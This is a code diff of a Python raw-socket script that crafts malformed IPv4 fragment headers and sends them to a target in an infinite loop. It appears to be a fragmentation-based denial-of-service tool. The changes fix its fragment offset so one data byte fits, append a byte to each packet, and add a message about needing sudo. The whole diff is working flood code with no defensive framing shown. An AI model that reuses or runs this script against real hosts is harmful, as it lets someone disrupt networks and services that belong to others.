@@ -19,7 +19,10 @@ def mk_sock():
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
         return sock
     except socket.error as e:
-        print(f"Could not create socket: {e}")
+        if e.errno == 1:
+            print("Script requires sudo privileges...")
+        else:
+            print(f"Could not create socket: {e}")
         sys.exit(1)
 
 
@@ -33,8 +36,9 @@ def mk_header_factory(src_ip, dst_ip):
     # Handled by OS
     tot_len = 0
     # Flags | Offset
-    # > Displays this as the very last fragment
-    frag_off = int("0b0001111111111111", base=2)
+    # > Displays this as the very last fragment.
+    # NOTE: Leaves one byte for data, or can be left empty.
+    frag_off = 0b0001111111111110
     ttl = 255
     proto = socket.IPPROTO_TCP
     # Handled by OS
@@ -76,7 +80,9 @@ def main():
     counter = 0
     try:
         while True:
-            header = header_factory(counter % MAX_PACKET_ID)
+            header = bytearray(header_factory(counter % MAX_PACKET_ID))
+            # Add a byte, can be any num in [0, 255]
+            header.append(10)
             sock.sendto(header, (target, 0))
             counter += 1
     except KeyboardInterrupt:
